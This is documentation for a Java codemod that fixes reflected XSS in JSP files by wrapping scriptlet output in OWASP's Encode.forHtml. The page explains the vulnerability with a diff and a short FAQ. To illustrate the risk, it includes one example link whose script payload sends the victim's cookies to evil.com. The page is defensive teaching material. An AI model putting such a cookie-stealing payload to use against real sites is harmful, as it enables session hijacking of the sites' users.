---
title: "Encode Untrusted Scriptlet Contents"
sidebar_position: 1
---

## pixee:java/encode-jsp-scriptlet

| Importance | Review Guidance            | Requires Scanning Tool |
|------------|----------------------------|------------------------|
 | High       | Merge After Cursory Review | No                     |


This codemod encodes certain JSP scriptlets to fix what appear to be trivially exploitable [Reflected Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting) vulnerabilities in JSP files. XSS is a vulnerability that is tricky to understand initially, but easy to exploit.

Consider the following example code:

```java
Welcome to our site <%= request.getParameter("name") %>
```

An attacker could construct a link with an HTTP parameter `name` containing malicious JavaScript and send it to the victims, and if they click it, cause it to execute in the victims' browsers in the domain context. This could allow attackers to exfiltrate session cookies and spoof their identity, perform actions on victim's behalf, and more generally "do anything" as that user. Here's an example of such an evil link used by attacker to leak the victim's cookies back to their evil site logs:

`https://bank.com/search?name=<script>document.location='http://evil.com/?'+document.cookie</script>`

Our changes introduce an HTML-encoding mechanism that look something like this:

```diff
-Welcome to our site <%= request.getParameter("name") %>
+Welcome to our site <%= org.owasp.encoder.Encode.forHtml(request.getParameter("name")) %>
```

This codemod encodes HTML control characters that attackers would use to execute code. 

If you have feedback on this codemod, [please let us know](mailto:feedback@pixee.ai)!

## F.A.Q. 

### Why is this codemod marked as Merge After Cursory Review?

This change is safe and effective in almost all situations. However, depending on the context in which the scriptlet is rendered (e.g., inside an HTML tag, in JavaScript, unquoted contexts, etc.), you may need to use another encoding method. Check out the [OWASP XSS Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) to learn more about these cases and other controls you may need in exceptional cases. The security control introduced from OWASP used has `forHtml()` variants for all situations (e.g., `forJavaScript()`, `forCssString()`).

## Codemod Settings

N/A

## References
* [Security Control (OWASP Encode.java) source code](https://github.com/OWASP/owasp-java-encoder/blob/main/core/src/main/java/org/owasp/encoder/Encode.java#L143)
* [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
* [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 
* [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
